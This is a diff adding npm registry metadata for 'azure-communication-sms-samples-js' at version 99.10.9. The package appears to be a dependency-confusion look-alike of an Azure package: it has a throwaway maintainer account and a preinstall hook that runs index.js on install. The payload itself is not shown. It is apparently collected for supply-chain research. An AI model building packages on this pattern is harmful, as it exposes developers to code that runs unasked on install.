@@ -1,0 +1,62 @@
+{
+    "_id": "azure-communication-sms-samples-js",
+    "name": "azure-communication-sms-samples-js",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "azure-communication-sms-samples-js",
+            "version": "99.10.9",
+            "description": "azure package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "azure-communication-sms-samples-js@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-CKD1P5x9Qv01I1Bqy9TUyz4vCKFTabP3cpss/tf0HxR3dSFoXD6SOc03Mmkdq+99AlKWeAoPBXFu34RvoCf93Q==",
+                "shasum": "5287977784f56f80fff59fcd0962581210943ecb",
+                "tarball": "https://registry.npmjs.org/azure-communication-sms-samples-js/-/azure-communication-sms-samples-js-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5086,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiOoL9ACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmoNwQ//bFQmjLTVxSYo5x2UMes60xTz2h6NjHXH07v5w/mPiegBwsLH\r\n20xpL3u/t1nDDBeC7i4Wt6Gdy7FTgo6tWJj6TCQufSRIG5LSBQlHBgRA3gkC\r\npAfBrDb3f+/d3IrZ6TxzZHScr6CbI+R4lxbPhOCt3fzZYkFeClpAWGV7Vw4f\r\nJS95Rl8lKANrwfsQ+VGis3FxWPHrRnSi02HrVfFDh6b6zLqWGe7oAy2jocpF\r\nOBDOTX8HbCnmVZkLlMVzmKwetUl21YN20/8thfM8B50RJwCirdLRfvNp9oeI\r\nUUQfw69TIT9Bldf5h+w3LftL3/+p2X6dJbJRYgSeWYJZduXwOT9U3/5bh6AP\r\nDkKoLvOutkKhpGzsmsXsNwdqkS3k3jD23gJZyTSSTMyhrmzU0et4/mWPwTrc\r\nXEsA3F5Ape4MpJ9e/IjcJRl6UHu8IIzvSX4JCUXKCrsWxx3vDVDr0u+1IsG0\r\nUEUGHeXCcEI/2fHELkmWN/Z05LVsSdlFTqOgmEDtr3r5wz5/kow6XMEiFNBM\r\naapCHDgY5IhKIsOtpSJUH/7k86BhmiNxgPRy7zIhOCuyA+Lb6r5mfUjQCTka\r\nilAnTD9mYqe54tLcr5GKWlpjpI7MVRdy4wGxbB92rrC/EE0xQEJa6cGhzdX8\r\n3NO1VFlHxsiXq7mWOdOKZN1jHlhI8v2cMgg=\r\n=ujN6\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "ta4xf4q4",
+                "email": "ta4xf4q4@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "ta4xf4q4",
+                    "email": "ta4xf4q4@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/azure-communication-sms-samples-js_99.10.9_1648001789009_0.06028001381935355"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-23T02:16:29.008Z",
+        "99.10.9": "2022-03-23T02:16:29.172Z",
+        "modified": "2022-03-23T02:16:29.259Z"
+    },
+    "maintainers": [
+        {
+            "name": "ta4xf4q4",
+            "email": "ta4xf4q4@rt11.ml"
+        }
+    ],
+    "description": "azure package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
